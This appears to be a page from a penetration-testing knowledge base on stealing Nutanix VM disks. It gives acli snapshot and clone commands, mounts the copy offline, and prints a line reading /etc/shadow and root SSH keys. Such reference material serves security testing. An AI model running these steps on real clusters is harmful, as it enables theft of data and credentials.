---
title: "Disk and snapshot theft: taking vdisks from the Nutanix storage fabric"
description: "Nutanix stores each VM's disks as vdisks in the Acropolis Distributed Storage Fabric, accessed through the Controller VMs. With CVM or Prism access, an attacker clones or snapshots a target vdisk, exports it as an image, and reads the guest filesystem offline, taking any VM's data without entering it, and reads snapshots for point-in-time state."
keywords:
  - vdisk
  - distributed storage fabric
  - snapshot
  - image export
  - nutanix
---

# Disk and snapshot theft

Nutanix keeps each VM's disks as vdisks in the Acropolis Distributed Storage Fabric, served by the Controller VMs rather than as plain files on a single host. The theft path therefore goes through the CVM or Prism rather than copying a file off a datastore: an attacker with that access clones or snapshots the target vdisk, exports it as an image (or attaches the clone to a VM they control), and reads the guest filesystem offline. Snapshots give point-in-time copies, and the clone-and-attach technique reads any VM's disk without entering that VM.

## Clone, export, and read

```bash
# via the CVM CLI: snapshot/clone a target VM's disk, then export or attach it
acli vm.list                                   # find the target VM
acli snapshot.create <vm>                       # point-in-time snapshot
acli vm.clone <attacker-vm> clone_from_vm=<vm>  # clone whose disks you can mount
# or attach the cloned vdisk to a VM you control and read it from inside
# via Prism v3: clone the vdisk / create an image from it, then download the image
```

```bash
# once you have the image/clone attached to a controlled VM, read it offline
guestmount -a /dev/<attached-disk> -i --ro /mnt/guest
cat /mnt/guest/etc/shadow /mnt/guest/root/.ssh/id_* 2>/dev/null
```

## Exploitation notes

- Access to the fabric is through the CVM/Prism, not a file copy: the practical techniques are snapshot, clone, or image-export of the target vdisk, then attach the result to a controlled VM or download the exported image.
- Attaching a clone to an attacker-controlled VM and mounting it offline bypasses all in-guest controls, exactly like file-based VMDK/qcow2 theft elsewhere; prioritise credential stores.
- Snapshots capture point-in-time state; a VM with application-consistent or memory snapshots may expose more. Image export produces a portable copy to exfiltrate.
- This requires CVM or Prism access, so it chains from [Host access and shell](host-access-and-shell.md) and the [Management plane](management-plane.md).

## Tools

- [libguestfs / guestmount](https://libguestfs.org/)

## References

- [Nutanix: snapshots and clones](https://portal.nutanix.com/)
- [Acropolis Distributed Storage Fabric](https://www.nutanix.com/products/ahv)
